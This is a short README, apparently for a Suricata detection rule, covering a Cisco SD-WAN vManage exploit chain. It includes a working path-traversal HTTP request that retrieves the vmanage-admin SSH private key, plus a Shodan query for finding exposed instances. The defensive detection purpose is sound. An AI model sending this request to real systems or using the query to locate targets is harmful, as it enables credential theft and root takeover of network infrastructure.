## Overview
A chain of CVE-2020-26073 (path traversal), CVE-2020-27129 (command injection), and CVE-2020-26074 (suid privilege escalation) could lead to unauthenticated remote code execution with root privilege on Cisco SD-WAN vManage.

CVE-2020-26073 is the most important part of the exploit chain because it allows attackers to get the SSH private key of the user vmanage-admin on the target server without authenticating.

So, detecting the payload of CVE-2020-26073 is enough to detect the whole exploit chain. In my Suricata rule, I try to capture the HTTP GET request with the strings "/dataservice/disasterrecovery/download/token/" and "%2e%2e" in the URL.

### Bonus for bug bounty hunters
Search for Cisco SD-WAN vManage on Shodan:
**http.title:"Cisco vManage"**

## Proof of Concept
* CVE-2020-26073:
```
GET /dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fviptela%2F.ssh%2Fid_dsa HTTP/1.1
Host: example.com
User-Agent: curl/7.47.0
Accept: */*
Connection: close
```

## References
* https://medium.com/realmodelabs/sd-pwn-part-3-cisco-vmanage-another-day-another-network-takeover-15731a4d75b7
* https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-vman-traversal-hQh24tmk
* https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-vmanage-privilege-zPmMf73k
* https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-vmanage-escalation-Jhqs5Skf